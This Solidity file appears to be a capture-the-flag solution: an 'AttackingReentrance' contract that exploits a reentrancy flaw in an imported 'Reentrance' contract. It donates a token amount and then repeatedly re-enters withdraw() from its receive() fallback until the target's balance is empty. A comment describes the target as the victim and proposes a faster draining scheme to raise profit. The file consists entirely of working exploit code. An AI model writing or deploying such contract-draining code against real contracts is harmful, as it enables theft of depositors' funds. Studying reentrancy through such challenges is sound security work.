// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function donate(uint value) private {
        Reentrance(contractAddress).donate{value: value}(address(this));
    }

    function withdraw() private {
        Reentrance(contractAddress).withdraw();
    }

    receive() external payable {
        console.log("receiving");
        // TODO: we can make a smaller number of calls to the contract by 
        // re-depositing what we just withdrew, 
        // doubling the amount we can withdraw each time,
        // meaning we can finish this in O(logN) time instead of O(N)
        // where N is the initial balance of the victim contract.
        // this would effectively reduce our gas consumption and increase 
        // our profits - albeit by a small margin.

        if (contractAddress.balance > 0) {
            withdraw();
        }

    }

    function hackContract() external {
        donate(1);
        withdraw();
    }
}
